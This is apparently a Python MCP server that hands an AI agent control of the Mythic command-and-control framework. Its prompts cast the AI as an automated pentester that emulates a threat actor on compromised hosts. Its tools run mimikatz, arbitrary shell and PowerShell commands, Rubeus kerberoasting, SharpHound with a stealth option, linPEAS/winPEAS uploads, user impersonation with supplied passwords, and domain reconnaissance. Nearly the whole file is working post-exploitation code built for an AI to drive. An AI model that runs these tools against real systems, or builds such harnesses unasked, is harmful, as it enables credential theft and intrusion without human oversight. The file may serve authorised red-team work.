from typing import Any
from mcp.server.fastmcp import FastMCP
from lib.mythic_api import MythicAPI
import asyncio
import base64
import sys
import argparse

mcp = FastMCP("mythic_mcp")

api = None


@mcp.prompt()
def start_pentest(threat_actor: str, objective: str) -> str:
    return f"You are an automated pentester, tasked with emulating a specific threat actor. The threat actor is {threat_actor}. Your objective is: {objective}. Perform any required steps to meet the objective, using only techniques documented in the MCP server by the threat actor."


@mcp.prompt()
def start_recon() -> str:
    return "You are an automated pentester, tasked with performing recon. Use the available agents to gather information on the compromised hosts."


@mcp.tool()
async def run_as_user(agent_id: int, username: str, password: str):
    """Attempt to authenticate as another user (network calls only) for the current session.

    Args:
        username: Username of network account to use
        password: Password of network account to use
    """

    output = await api.make_token(agent_id, username, password)

    return f"---\nAuthentication Result: {output}\n---"


@mcp.tool()
async def execute_mimikatz(agent_id: int, mimikatz_arguments: str):
    """Runs mimikatz with the provided arguments, returning the output."""
    
    output = await api.execute_mimikatz(agent_id, mimikatz_arguments)
    
    return f"---\n{output}\n---"



@mcp.tool()
async def read_file(agent_id: int, file_path: str):
    """Reads a file using the ReadFile win32 API call. Returns the contents of that file.

    Args:
        agent_id: ID of agent to read file from
        file_path: Path to the file to read on the target server
    """

    output = await api.read_file(agent_id, file_path)

    return f"---\n{output}\n---"


@mcp.tool()
async def run_shell_command(agent_id: int, command_line: str):
    """Execute a shell script command line against a running agent. This script is executed using the default command line interpreter.

    Args:
        agent_id: ID of agent to execute command on
        command_line: A command to be executed
    """

    output = await api.execute_shell_command(agent_id, command_line)

    return f"---\n{output}\n---"


@mcp.tool()
async def get_all_agents():
    """Returns a list of active agents"""

    output = ""

    agents = await api.get_all_agents()

    for agent in agents:
        output += f"ID: {agent['id']}\n"
        output += f"Host: {agent['host']}\n"
        output += f"User: {agent['user']}\n"

    return output

@mcp.tool()
async def privilege_escalation_peas(
    agent_id: int,
    os_type: str,
    peas_base64: str,
    mode: str = "quiet",
):
    """
    Run linPEAS or winPEAS on the target agent for privilege escalation discovery.

    Args:
        agent_id: Mythic agent ID
        os_type: 'linux' or 'windows'
        peas_base64: Base64 encoded linpeas.sh or winPEAS.exe
        mode: 'quiet' or 'full'
    """

    if os_type.lower() == "linux":
        remote_path = "/tmp/linpeas.sh"
        file_name = "linpeas.sh"

        # Upload linpeas
        await api.upload_file(
            agent_id,
            file_name,
            remote_path,
            base64.b64decode(peas_base64),
        )

        # Make executable
        await api.execute_shell_command(
            agent_id,
            f"chmod +x {remote_path}"
        )

        # Execute linPEAS
        cmd = f"bash {remote_path} -q" if mode == "quiet" else f"bash {remote_path}"
        output = await api.execute_shell_command(agent_id, cmd)

        return f"--- linPEAS Output ---\n{output}\n---"

    elif os_type.lower() == "windows":
        remote_path = "C:\\Users\\Temp\\winpeas.exe"
        file_name = "winpeas.exe"

        # Upload winPEAS
        await api.upload_file(
            agent_id,
            file_name,
            remote_path,
            base64.b64decode(peas_base64),
        )

        # Execute winPEAS
        cmd = f"{remote_path} quiet" if mode == "quiet" else remote_path
        output = await api.execute_shell_command(agent_id, cmd)

        return f"--- winPEAS Output ---\n{output}\n---"

    else:
        return "Unsupported OS type. Use 'linux' or 'windows'."

@mcp.tool()
async def run_sharphound(
    agent_id: int,
    collection: str = "All",
    output_dir: str = "C:\\Users\\Temp",
    stealth: bool = True,
):
    """
    Run SharpHound (BloodHound collector) on a Windows agent.
    SharpHound.exe must already exist on the target system.

    Args:
        agent_id: ID of the Mythic agent
        collection: SharpHound collection methods (Default: All)
        output_dir: Directory to store SharpHound output ZIP
        stealth: Use stealth collection (recommended)
    """

    sharphound_path = "C:\\Users\\Temp\\SharpHound.exe"

    cmd = (
        f"{sharphound_path} "
        f"-c {collection} "
        f"--outputdirectory {output_dir} "
    )

    if stealth:
        cmd += "--stealth "

    output = await run_shell_command(agent_id, cmd)

    return (
        "--- SharpHound Execution Output ---\n"
        f"{output}\n"
        f"Output ZIP saved in: {output_dir}\n"
        "---"
    )

@mcp.tool()
async def execute_powershell(agent_id: int, script: str):
    """Execute a PowerShell script on the target agent. The script is sent raw and encoded to UTF-16LE for -EncodedCommand."""
    output = await api.execute_powershell(agent_id, script)
    return f"---\n{output}\n---"

@mcp.tool()
async def ad_recon(agent_id: int):
    """Run AD reconnaissance commands and collate results."""
    out = ""
    whoami = await api.execute_shell_command(agent_id, "whoami /all")
    out += "--- whoami /all ---\n" + str(whoami) + "\n"
    domain = (await api.execute_shell_command(agent_id, "echo %USERDOMAIN%")).strip()
    out += f"Detected domain: {domain}\n"
    net_users = await api.execute_shell_command(agent_id, "net user /domain")
    out += "\n--- net user /domain ---\n" + str(net_users) + "\n"
    net_groups = await api.execute_shell_command(agent_id, "net group /domain")
    out += "\n--- net group /domain ---\n" + str(net_groups) + "\n"
    if domain:
        try:
            dclist = await api.execute_shell_command(agent_id, f"nltest /dclist:{domain}")
            out += "\n--- nltest /dclist ---\n" + str(dclist) + "\n"
        except Exception:
            out += "\n--- nltest failed or not available ---\n"
    shares = await api.execute_shell_command(agent_id, "net share")
    out += "\n--- net share ---\n" + str(shares) + "\n"
    return out

@mcp.tool()
async def enum_domain_users(agent_id: int):
    """Attempt to enumerate domain users. Uses AD cmdlets if available, falls back to net user /domain."""
    ps = (
        "try { Import-Module ActiveDirectory -ErrorAction Stop; "
        "Get-ADUser -Filter * -Properties SamAccountName,DisplayName,LastLogonDate | "
        "Select SamAccountName,DisplayName,LastLogonDate | ConvertTo-Json -Depth 3 } "
        "catch { net user /domain }"
    )
    output = await execute_powershell(agent_id, ps)
    return output

@mcp.tool()
async def run_kerberoast(agent_id: int, rubeus_base64: str, args: str = "kerberoast"):
    """Upload and run Rubeus (Kerberoasting)."""
    remote_path = "C:\\Windows\\Temp\\Rubeus.exe"
    file_name = "Rubeus.exe"
    await api.upload_file(agent_id, file_name, remote_path, base64.b64decode(rubeus_base64))
    cmd = f"{remote_path} {args}"
    output = await api.execute_shell_command(agent_id, cmd)
    return f"--- Rubeus Output ---\n{output}\n---"

@mcp.tool()
async def upload_file(agent_id: int, file_name: str, remote_path: str, content: str):
    """Upload a file to the Mythic server, and then upload the file to the remote target

    Args:
        agent_id: ID of the agent to execute command on
        file_name: Name to give the file when uploading to Mythic server
        remote_path: Full path to where the file will be uploaded
        content: Base64 encoded contents of the file
    """

    decoded_contents = base64.b64decode(content)
    status = await api.upload_file(agent_id, file_name, remote_path, decoded_contents)

    if status:
        return "---\nFile uploaded successfully\n---"
    else:
        return "---\nError uploading file\n---"


async def main():
    await api.connect()
    await mcp.run_stdio_async()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MCP for Mythic")
    parser.add_argument(
        "username", type=str, help="Username used to connect to Mythic API"
    )
    parser.add_argument(
        "password", type=str, help="Password used to connect to Mythic API"
    )
    parser.add_argument("host", type=str, help="Host (IP or DNS) of Mythic API server")
    parser.add_argument("port", type=str, help="Port of Mythic server HTTP server")

    args = parser.parse_args()
    api = MythicAPI(args.username, args.password, args.host, args.port)

    asyncio.run(main())
